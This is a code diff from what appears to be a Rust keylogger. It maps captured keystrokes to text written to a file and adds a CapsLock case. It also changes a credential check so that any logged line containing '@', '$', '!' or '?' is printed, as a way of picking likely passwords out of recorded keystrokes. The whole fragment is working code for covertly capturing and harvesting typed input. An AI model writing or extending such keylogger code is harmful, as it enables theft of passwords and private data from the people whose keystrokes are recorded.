@@ -8,6 +8,7 @@ use dotenv::dotenv;
 use std::{ env };
 use std::{thread, time};
 use std::fs;
+use regex::Regex;
 
 pub fn match_case(key: &Keycode) -> &'static str {
 
@@ -31,6 +32,13 @@ pub fn match_case(key: &Keycode) -> &'static str {
             file.write(b"\n").expect("Failed to write to file");
             "Enter"
         }
+
+        Keycode::CapsLock => {
+            // write to file
+            file.write(b"caps").expect("Failed to write to file");
+            "caps"
+        }
+
         Keycode::RShift | Keycode::Slash => {
             // write to file
             file.write(b"?").expect("Failed to write to file");
@@ -60,9 +68,14 @@ fn size_check(file: &mut std::fs::File) {
 }
 
 fn creds_check(content: String) {
+    let a = ["@", "$", "!", "?"];
+    
     for line in content.lines() {
-        if line.contains("password") {
-            println!("FOUND!");
+        // check if line contains any of the above
+        for c in a.iter() {
+            if line.contains(c) {
+                println!("{}", line);
+            }
         }
     }
 }
